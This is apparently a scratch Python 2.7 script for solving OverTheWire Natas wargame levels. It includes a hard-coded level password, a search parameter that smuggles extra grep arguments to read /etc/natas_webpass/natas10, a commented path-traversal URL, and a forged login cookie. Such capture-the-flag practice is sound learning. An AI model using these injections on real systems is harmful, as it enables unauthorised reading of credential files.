#python2.7
import requests
import re
username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
url = 'http://%s.natas.labs.overthewire.org/' % username
#http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
#headers = {'Authorization': 'access_token myToken' }

#response = requests.get(url,  headers = headers,auth = (username, password))

s = requests.Session()
#s.auth = (username, password)
s.headers.update({'x-test': 'true'})

#send own cookie
cookies = {"loggedin" : "1"}

#r = s.get(url, auth = (username, password), cookies = cookies,)

r = s.post(url, params = {'needle':'u /etc/natas_webpass/natas10','submit':'submit'},  auth = (username, password) )
print r.text
#print 'print cookie:'
#print s.cookies['loggedin']
content = r.text
#print content
#print re.findall('natas8 is (.*)', content)[0]